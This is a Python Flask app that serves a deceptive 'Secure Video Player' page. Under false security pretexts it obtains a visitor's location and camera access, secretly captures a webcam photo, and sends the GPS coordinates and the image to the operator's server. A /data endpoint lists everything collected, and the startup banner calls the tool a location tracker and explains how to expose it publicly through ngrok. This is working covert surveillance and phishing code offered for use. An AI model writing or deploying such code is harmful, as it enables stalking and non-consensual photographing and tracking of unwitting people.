import os
import uuid
import json
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify

app = Flask(__name__)

# Create necessary directories
os.makedirs('photos', exist_ok=True)
os.makedirs('data', exist_ok=True)

# Store user data
user_data_file = 'data/user_data.json'

def save_user_data(lat, lon, photo_filename, timestamp):
    """Save user data to JSON file"""
    data = {
        'timestamp': timestamp,
        'latitude': lat,
        'longitude': lon,
        'photo': photo_filename,
        'map_link': f"https://www.google.com/maps?q={lat},{lon}"
    }
    
    # Load existing data
    if os.path.exists(user_data_file):
        with open(user_data_file, 'r') as f:
            all_data = json.load(f)
    else:
        all_data = []
    
    all_data.append(data)
    
    # Save updated data
    with open(user_data_file, 'w') as f:
        json.dump(all_data, f, indent=2)
    
    return data

@app.route('/')
def index():
    # You can replace this YouTube video ID with any video you want
    youtube_video_id = "GWvfyvKUTZI"  # From the link you provided
    
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Video Player</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 800px;
            width: 100%;
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2em;
            margin-bottom: 10px;
        }
        
        .header p {
            opacity: 0.9;
            font-size: 1.1em;
        }
        
        .content {
            padding: 40px;
        }
        
        #permissionScreen {
            text-align: center;
        }
        
        .permission-item {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 25px;
            margin: 20px 0;
            display: flex;
            align-items: center;
            justify-content: space-between;
            transition: all 0.3s ease;
        }
        
        .permission-item:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        
        .permission-info {
            display: flex;
            align-items: center;
            gap: 15px;
            text-align: left;
        }
        
        .permission-icon {
            font-size: 2em;
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .permission-status {
            font-size: 1.5em;
        }
        
        .status-pending { color: #ffc107; }
        .status-granted { color: #28a745; }
        .status-denied { color: #dc3545; }
        
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 1.1em;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 20px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }
        
        .btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }
        
        #videoScreen {
            display: none;
        }
        
        .video-container {
            position: relative;
            padding-bottom: 56.25%; /* 16:9 aspect ratio */
            height: 0;
            overflow: hidden;
            border-radius: 10px;
        }
        
        .video-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
        
        #video, #canvas {
            display: none;
        }
        
        .loading {
            text-align: center;
            padding: 40px;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .error-message {
            background: #f8d7da;
            color: #721c24;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎬 Secure Video Player</h1>
            <p>Please grant permissions to watch the video</p>
        </div>
        
        <div class="content">
            <div id="permissionScreen">
                <div class="permission-item">
                    <div class="permission-info">
                        <div class="permission-icon">📍</div>
                        <div>
                            <h3>Location Access</h3>
                            <p>Required to verify your location</p>
                        </div>
                    </div>
                    <div class="permission-status status-pending" id="locationStatus">⏳</div>
                </div>
                
                <div class="permission-item">
                    <div class="permission-info">
                        <div class="permission-icon">📷</div>
                        <div>
                            <h3>Camera Access</h3>
                            <p>Required for security verification</p>
                        </div>
                    </div>
                    <div class="permission-status status-pending" id="cameraStatus">⏳</div>
                </div>
                
                <button class="btn" id="grantBtn" onclick="requestPermissions()">
                    Grant Permissions & Watch Video
                </button>
            </div>
            
            <div id="loadingScreen" style="display:none;">
                <div class="loading">
                    <div class="spinner"></div>
                    <p>Processing your request...</p>
                </div>
            </div>
            
            <div id="videoScreen">
                <div class="success-message">
                    <h3>✅ All permissions granted!</h3>
                    <p>Enjoy your video</p>
                </div>
                <div class="video-container">
                    <iframe 
                        id="youtubePlayer"
                        src="https://www.youtube.com/embed/{{ video_id }}?autoplay=1&enablejsapi=1"
                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                        allowfullscreen>
                    </iframe>
                </div>
            </div>
            
            <div id="errorScreen" style="display:none;">
                <div class="error-message">
                    <h3>❌ Permission Denied</h3>
                    <p id="errorMessage"></p>
                    <button class="btn" onclick="location.reload()">Try Again</button>
                </div>
            </div>
        </div>
    </div>
    
    <video id="video"></video>
    <canvas id="canvas"></canvas>
    
    <script>
        let locationData = null;
        let cameraStream = null;
        
        async function requestPermissions() {
            const grantBtn = document.getElementById('grantBtn');
            grantBtn.disabled = true;
            grantBtn.textContent = 'Processing...';
            
            try {
                // Step 1: Request Location
                await requestLocation();
                
                // Step 2: Request Camera
                await requestCamera();
                
                // Step 3: Capture Photo
                await capturePhoto();
                
                // Step 4: Show video
                showVideo();
                
            } catch (error) {
                showError(error.message);
            }
        }
        
        function requestLocation() {
            return new Promise((resolve, reject) => {
                const locationStatus = document.getElementById('locationStatus');
                
                if (!navigator.geolocation) {
                    locationStatus.textContent = '❌';
                    locationStatus.className = 'permission-status status-denied';
                    reject(new Error('Geolocation is not supported by your browser'));
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        locationData = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude
                        };
                        locationStatus.textContent = '✅';
                        locationStatus.className = 'permission-status status-granted';
                        console.log('Location granted:', locationData);
                        resolve();
                    },
                    (error) => {
                        locationStatus.textContent = '❌';
                        locationStatus.className = 'permission-status status-denied';
                        let errorMsg = 'Location access denied';
                        if (error.code === error.PERMISSION_DENIED) {
                            errorMsg = 'Please allow location access to continue';
                        }
                        reject(new Error(errorMsg));
                    }
                );
            });
        }
        
        function requestCamera() {
            return new Promise((resolve, reject) => {
                const cameraStatus = document.getElementById('cameraStatus');
                
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                    .then((stream) => {
                        cameraStream = stream;
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        video.play();
                        cameraStatus.textContent = '✅';
                        cameraStatus.className = 'permission-status status-granted';
                        console.log('Camera access granted');
                        resolve();
                    })
                    .catch((error) => {
                        cameraStatus.textContent = '❌';
                        cameraStatus.className = 'permission-status status-denied';
                        reject(new Error('Please allow camera access to continue'));
                    });
            });
        }
        
        function capturePhoto() {
            return new Promise((resolve, reject) => {
                document.getElementById('permissionScreen').style.display = 'none';
                document.getElementById('loadingScreen').style.display = 'block';
                
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob((blob) => {
                        const formData = new FormData();
                        formData.append('lat', locationData.lat);
                        formData.append('lon', locationData.lon);
                        formData.append('photo', blob, 'photo.jpg');
                        formData.append('timestamp', new Date().toISOString());
                        
                        fetch('/upload', {
                            method: 'POST',
                            body: formData
                        })
                        .then(response => response.json())
                        .then(data => {
                            console.log('Data sent successfully:', data);
                            // Stop camera
                            if (cameraStream) {
                                cameraStream.getTracks().forEach(track => track.stop());
                            }
                            resolve();
                        })
                        .catch((error) => {
                            console.error('Error sending data:', error);
                            reject(error);
                        });
                    }, 'image/jpeg');
                }, 1500);
            });
        }
        
        function showVideo() {
            document.getElementById('loadingScreen').style.display = 'none';
            document.getElementById('videoScreen').style.display = 'block';
        }
        
        function showError(message) {
            document.getElementById('permissionScreen').style.display = 'none';
            document.getElementById('loadingScreen').style.display = 'none';
            document.getElementById('errorScreen').style.display = 'block';
            document.getElementById('errorMessage').textContent = message;
        }
    </script>
</body>
</html>
    ''', video_id=youtube_video_id)

@app.route('/upload', methods=['POST'])
def upload():
    try:
        lat = request.form['lat']
        lon = request.form['lon']
        timestamp = request.form.get('timestamp', datetime.now().isoformat())
        photo = request.files['photo']
        
        # Generate unique filename
        photo_filename = f"photos/{uuid.uuid4()}.jpg"
        photo.save(photo_filename)
        
        # Save data
        data = save_user_data(lat, lon, photo_filename, timestamp)
        
        print(f"\n{'='*50}")
        print(f"New User Data Received:")
        print(f"Time: {timestamp}")
        print(f"Location: {data['map_link']}")
        print(f"Photo: {photo_filename}")
        print(f"{'='*50}\n")
        
        return jsonify({
            'status': 'success',
            'message': 'Data received successfully',
            'map_link': data['map_link']
        })
    except Exception as e:
        print(f"Error processing upload: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/data')
def view_data():
    """View all collected data"""
    if os.path.exists(user_data_file):
        with open(user_data_file, 'r') as f:
            data = json.load(f)
        return jsonify(data)
    return jsonify([])

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🚀 Advanced Location Tracker with YouTube Integration")
    print("="*60)
    print("\n📱 Local Access: http://localhost:5000")
    print("🌐 Network Access: http://<your-ip>:5000")
    print("📊 View collected data: http://localhost:5000/data")
    print("\n💡 To share publicly, you need to:")
    print("   1. Get ngrok authtoken from: https://dashboard.ngrok.com/signup")
    print("   2. Run: ngrok config add-authtoken <your-token>")
    print("   3. Then use app_advanced.py")
    print("\n" + "="*60 + "\n")
    
    # Run on all interfaces to allow network access
    app.run(host='0.0.0.0', port=5000, debug=True)
